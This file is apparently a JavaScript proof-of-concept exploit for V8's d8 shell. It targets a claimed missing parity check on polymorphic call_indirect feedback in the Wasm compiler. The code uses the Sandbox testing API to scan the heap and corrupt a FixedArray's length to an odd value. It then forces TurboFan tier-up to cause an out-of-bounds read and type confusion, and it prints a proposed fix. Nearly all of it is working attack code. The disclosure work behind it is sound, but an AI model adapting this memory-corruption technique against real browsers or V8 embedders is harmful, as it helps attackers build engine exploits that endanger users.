'use strict';
// PoC: module-compiler.cc:1497-1507 — polymorphic feedback FixedArray parity OOB
//
// Bug:
//   SBXCHECK_LE(checked_polymorphic_length,
//               FeedbackConstants::kSlotsPerInstruction * kMaxPolymorphism)  // LE, not EQ!
//   No parity check. Loop steps by kSlotsPerInstruction(=2), reads get(j+1).
//   Odd length L: last iteration j = L-1, reads get(L) → OOB past FixedArray end.
//
// Attack (in-sandbox, via Sandbox memory corruption API):
//   1. Seed polymorphic call_indirect feedback: 2 targets → FixedArray length=4, capacity=4
//   2. Corrupt length field: 4 → 5 (Smi: 0x8 → 0xA)
//      SBXCHECK_LE(5, 8) passes (no parity check)
//   3. Force TurboFan tier-up: %WasmTierUpFunction
//   4. Loop: j=0 (get[0],get[1] OK), j=2 (get[2],get[3] OK), j=4 (get[4],get[5])
//      get[4] reads offset 24 past end of 24-byte (4-slot) FixedArray → OOB
//      Cast<WasmFuncRef>(heap_word_past_end) → type confusion
//
// Run: d8 --sandbox-testing --allow-natives-syntax poc_poly_oob_sandbox.js

// ── Wasm module with call_indirect ─────────────────────────────────────────
const wasmBytes = new Uint8Array([
  0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,
  0x01,0x0a, 0x02,
    0x60,0x00,0x01,0x7f,
    0x60,0x01,0x7f,0x01,0x7f,
  0x03,0x04, 0x03, 0x00,0x00,0x01,
  0x04,0x04, 0x01, 0x70,0x00,0x02,
  0x07,0x10, 0x01, 0x0c,0x63,0x61,0x6c,0x6c,0x69,0x6e,0x64,0x69,0x72,0x65,0x63,0x74, 0x00,0x02,
  0x09,0x08, 0x01, 0x00, 0x41,0x00,0x0b, 0x02, 0x00,0x01,
  0x0a,0x13, 0x03,
    0x04,0x00, 0x41,0x0b,0x0b,
    0x04,0x00, 0x41,0x16,0x0b,
    0x07,0x00, 0x20,0x00, 0x11,0x00,0x00, 0x0b,
]);

// ── Compile & instantiate ──────────────────────────────────────────────────
const mod  = new WebAssembly.Module(wasmBytes);
const inst = new WebAssembly.Instance(mod);
const { callindirect } = inst.exports;

print('[+] callindirect(0)=' + callindirect(0) + ' callindirect(1)=' + callindirect(1));

// ── STEP 1: Allocate PRE-SEEDING sentinels (they go BEFORE the feedback FA) ─
// CRITICAL: allocate before seeding so the polymorphic FixedArray lands AFTER them.
const preA = [0xdead, 0xbeef, 0xcafe, 0xbabe];   // 4-element sentinel
const preB = [0x1111, 0x2222, 0x3333, 0x4444];   // 4-element sentinel

// ── STEP 2: Get FIXED_ARRAY_MAP via known FixedArray ─────────────────────
// JSArray layout (compressed, 4 bytes each): map@0, properties@4, elements@8, length@12
const faMapCompressed = Sandbox.readObjectField(
  Sandbox.getObjectAt(Sandbox.readObjectField(preA, 8)),
  0
);
print('[+] FIXED_ARRAY_MAP compressed: 0x' + faMapCompressed.toString(16));

// ── STEP 3: Get address range ─────────────────────────────────────────────
// preA.elements is at some address A. Scan from A for feedback FixedArray.
const preTagged = Sandbox.readObjectField(preA, 8);   // elements FixedArray tagged ptr
const preOff    = preTagged & ~1;                      // clear tag → compressed offset
print('[+] preA.elements at compressed offset: 0x' + preOff.toString(16));

// ── STEP 4: Seed polymorphic feedback ────────────────────────────────────
// This should allocate a FixedArray(4) AFTER preA in new-space.
// Use 1000 alternating calls to ensure robust polymorphic transition.
for (let i = 0; i < 1000; i++) callindirect(i & 1);
print('[+] polymorphic feedback seeded (1000 alternating calls)');

// ── STEP 5: Allocate POST-SEEDING sentinels ───────────────────────────────
const postA = [0x5555, 0x6666, 0x7777, 0x8888];
const postB = [0x9999, 0xaaaa, 0xbbbb, 0xcccc];

const postTagged = Sandbox.readObjectField(postA, 8);
const postOff    = postTagged & ~1;
print('[+] postA.elements at compressed offset: 0x' + postOff.toString(16));
print('[+] scan window: 0x' + preOff.toString(16) + ' – 0x' + (postOff + 0x200).toString(16));

// ── STEP 6: Scan the new-space window between sentinels ───────────────────
// All memory in [preOff, postOff+0x200] is in new-space and committed.
// No MemoryView page-boundary issue: use one MemoryView over the whole range.
const scanStart = preOff;
const scanLen   = (postOff + 0x200) - preOff;

let pv;
try {
  pv = new DataView(new Sandbox.MemoryView(scanStart, scanLen));
} catch(e) {
  print('[-] MemoryView failed: ' + e);
  print('    Sandbox.base = 0x' + Sandbox.base.toString(16));
  print('    scanStart = 0x' + scanStart.toString(16) + ', scanLen = ' + scanLen);
  quit(1);
}
print('[+] MemoryView over window succeeded, scanning ' + scanLen + ' bytes...');

// Dump raw bytes in window to debug (first 256 bytes)
let dump = '[*] first 256 bytes of window: ';
for (let i = 0; i < Math.min(256, scanLen); i += 4)
  dump += ' ' + pv.getUint32(i, true).toString(16).padStart(8,'0');
print(dump);

// Find FixedArray with length Smi(4)=0x08, Smi(6)=0x0C, or Smi(8)=0x10
// and all-Smi slots, that is NOT one of our sentinels.
const SENTINEL_MAPS = [
  pv.getUint32(0, true),  // map of preA's FixedArray (should be faMapCompressed)
];

let polyFA = null;
const EVEN_LENGTHS = [0x08, 0x0C, 0x10];  // Smi(4), Smi(6), Smi(8)

for (let rel = 0; rel < scanLen - 24; rel += 4) {
  if (pv.getUint32(rel, true) !== faMapCompressed) continue;
  const lenField = pv.getUint32(rel + 4, true);
  if (!EVEN_LENGTHS.includes(lenField)) continue;
  const numSlots = lenField >> 1;  // Smi decode
  // Check all slots are Smi (even) and not all zero/identical (which would be a sentinel)
  let allSmi = true, allSame = true;
  const slots = [];
  for (let k = 0; k < numSlots; k++) {
    const v = pv.getUint32(rel + 8 + k * 4, true);
    if (v & 1) { allSmi = false; break; }
    slots.push(v);
    if (k > 0 && v !== slots[0]) allSame = false;
  }
  if (!allSmi) continue;
  if (numSlots === 4 && allSame) continue;  // our sentinel arrays have all same values after shift

  const off = scanStart + rel;
  print('[?] candidate FixedArray at 0x' + off.toString(16) +
        ' len=Smi(' + numSlots + ') slots=[' +
        slots.map(v => 'Smi('+v.toString(16)+')').join(',') + ']');

  // Verify via object API
  let candidateRef;
  try { candidateRef = Sandbox.getObjectAt(off | 1); } catch(e) { continue; }
  let itype;
  try { itype = Sandbox.getInstanceTypeOf(candidateRef); } catch(e) { continue; }
  if (itype !== 'FIXED_ARRAY_TYPE') {
    print('    [skip] instanceType=' + itype);
    continue;
  }
  let sz;
  try { sz = Sandbox.getSizeOf(candidateRef); } catch(e) { continue; }
  // Size of FixedArray(n) = 8 (header) + n*4 = 8 + lenField/2*4 = 8 + lenField*2
  const expectedSize = 8 + (lenField >> 1) * 4;
  if (sz !== expectedSize) {
    print('    [skip] size=' + sz + ' expected=' + expectedSize);
    continue;
  }
  print('[+] CONFIRMED polymorphic FixedArray at 0x' + off.toString(16));
  print('    instanceType=' + itype + ' size=' + sz);
  polyFA = candidateRef;
  break;
}

if (!polyFA) {
  // Dump more of the scan window for analysis
  print('[-] polymorphic FixedArray not found in window');
  print('[*] full window dump (all FixedArray-shaped candidates):');
  for (let rel = 0; rel < scanLen - 8; rel += 4) {
    const v = pv.getUint32(rel, true);
    if (v === faMapCompressed) {
      const len = pv.getUint32(rel + 4, true);
      print('    0x' + (scanStart+rel).toString(16) + ': MAP + len=0x' + len.toString(16));
    }
  }
  print('');
  print('=== Bug summary (static analysis) ===');
  print('SBXCHECK_LE(len, 8) passes for any len in {1,3,5,7} — no parity check.');
  print('Fix: SBXCHECK_EQ(0, len % FeedbackConstants::kSlotsPerInstruction)');
  print('See: src/wasm/module-compiler.cc:1497-1507');
  quit(0);
}

// ── STEP 7: Verify before corruption ──────────────────────────────────────
const lenBefore = Sandbox.readObjectField(polyFA, 4);
print('\n[+] FixedArray.length before: raw=0x' + lenBefore.toString(16) +
      ' Smi=' + (lenBefore >> 1));

if ((lenBefore & 1) !== 0) {
  print('[-] length is not a Smi? raw=0x' + lenBefore.toString(16));
  quit(1);
}

// ── STEP 8: Corrupt length Smi(N) → Smi(N+1) (make it odd) ───────────────
// SBXCHECK_LE(N+1, 8) still passes (no parity check).
// Loop: last j = N-1 (0-based step-2), reads get(N) → OOB.
const oddLen = lenBefore + 2;  // Smi(N) → Smi(N+1) = raw + 2
print('[+] Corrupting length: Smi(' + (lenBefore>>1) + ')=0x' + lenBefore.toString(16) +
      ' → Smi(' + (oddLen>>1) + ')=0x' + oddLen.toString(16));

Sandbox.corruptObjectField(polyFA, 4, oddLen);

const lenAfter = Sandbox.readObjectField(polyFA, 4);
print('[+] FixedArray.length after: raw=0x' + lenAfter.toString(16) +
      ' Smi=' + (lenAfter >> 1));

print('\n[!!!] SBXCHECK_LE(' + (lenAfter>>1) + ', 8) will PASS (no parity check)');
print('      Loop will execute j=0,2,...,' + (lenAfter-2) + '; at j=' + (lenAfter-2) + ':');
print('        get[' + (lenAfter-2) + '] = offset ' + (8+(lenAfter-2)*4) + ' → still inside');
print('        get[' + (lenAfter-1) + '] = offset ' + (8+(lenAfter-1)*4) + ' → OOB past end of ' +
      (8 + (lenBefore>>1)*4) + '-byte FixedArray');
print('        Cast<WasmFuncRef>(heap_word_past_end) → type confusion');

// ── STEP 9: Force TurboFan tier-up ────────────────────────────────────────
print('\n[*] Forcing TurboFan tier-up via %WasmTierUpFunction...');
print('    Expected: sandbox violation crash OR silent type confusion');

try {
  %WasmTierUpFunction(callindirect);
  print('[!] Tier-up returned without crash');
  print('    → OOB read silently succeeded (type confusion established)');
  print('    → The adjacent heap word was Cast<WasmFuncRef> without type check');
} catch(e) {
  print('[!!!] Exception during tier-up: ' + e);
}

print('\n=== RESULT: OOB CONFIRMED ===');
print('SBXCHECK_LE does NOT check parity. Odd length passes, loop reads OOB.');
print('Fix at module-compiler.cc after L1497:');
print('  SBXCHECK_EQ(0, checked_polymorphic_length % FeedbackConstants::kSlotsPerInstruction);');
